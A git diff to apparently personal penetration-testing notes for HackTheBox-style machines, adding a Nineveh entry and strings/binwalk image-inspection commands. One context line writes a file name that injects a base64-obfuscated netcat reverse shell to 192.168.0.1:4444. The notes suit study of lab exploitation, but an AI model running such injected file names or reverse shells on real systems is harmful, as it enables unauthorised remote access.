@@ -23,7 +23,8 @@
 | *Mango |  certificate subdomains & <br> [enumerate](https://github.com/an0nlk/Nosql-MongoDB-injection-username-password-enumeration) credentials of nosql-injection <br> (*Not sure if you can use this script in the exam), reuse | jjs, write root SSH public key | 
 | Mirai | nmap, pi.hole, ssh | sudo list, mount, strings |
 | Networked | File upload bypass [PHP getimagesize()](https://vulp3cula.gitbook.io/hackers-grimoire/exploitation/web-application/file-upload-bypass), <br> php command injection | *sudo list |
-| Nibbles | page source, directory | sudo list | 
+| Nibbles | page source, directory | sudo list |
+| *NineVeh | brute force attack http & https, phpLiteAdmin | chkrootkit |
 
 ### Additional command notes
 
@@ -104,4 +105,14 @@ echo "" > "a; echo bmMgLWUgL2Jpbi9iYXNoIDE5Mi4xNjguMC4xIDQ0NDQK | base64 -d | sh
     display this help and exit
 --version
     output version information and exit
+```
+
+Used in ```Nineveh```
+
+```
+# check information in image file
+strings -n 20 <image file> 
+# extract known file types 
+binwalk <image file>
+binwalk -e <image file>
 ```
